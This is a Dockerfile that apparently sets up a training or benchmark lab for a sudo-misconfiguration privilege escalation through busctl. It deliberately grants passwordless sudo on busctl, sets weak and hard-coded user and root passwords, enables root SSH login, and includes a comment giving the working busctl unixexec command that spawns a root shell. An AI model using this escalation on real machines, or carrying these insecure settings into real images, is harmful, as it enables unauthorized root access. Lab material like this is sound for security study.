FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_busctl
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/busctl as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and systemd (which provides busctl)
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        systemd \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify busctl is installed
RUN which busctl && ls -la /usr/bin/busctl

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# busctl can be abused to spawn a shell via the --address=unixexec: option.
# The exploit:
#   sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 \
#     org.freedesktop.systemd1.Manager LogLevel s debug \
#     --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
# This causes busctl to execute /bin/sh as root before connecting to dbus.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/busctl" > /etc/sudoers.d/busctl && \
    chmod 440 /etc/sudoers.d/busctl

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]